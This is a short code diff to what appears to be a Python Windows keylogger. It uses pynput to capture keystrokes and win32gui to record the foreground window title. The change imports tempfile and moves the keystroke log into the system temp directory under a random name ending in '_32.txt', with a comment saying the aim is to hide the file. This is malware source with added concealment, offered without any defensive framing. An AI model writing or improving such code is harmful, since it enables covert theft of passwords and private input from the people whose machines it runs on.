@@ -3,14 +3,16 @@
 import random
 import string
 import datetime
+import tempfile
 import threading
 import os
 from pynput import keyboard
 from win32gui import GetWindowText, GetForegroundWindow
 
-
+# find temp dir to hide file
+tempdir = tempfile.gettempdir()
 # generate a random filename for our log file
-fname = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10)) + ".txt"
+fname = tempdir + "\\" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10)) + "_32.txt"
 
 
 def log():
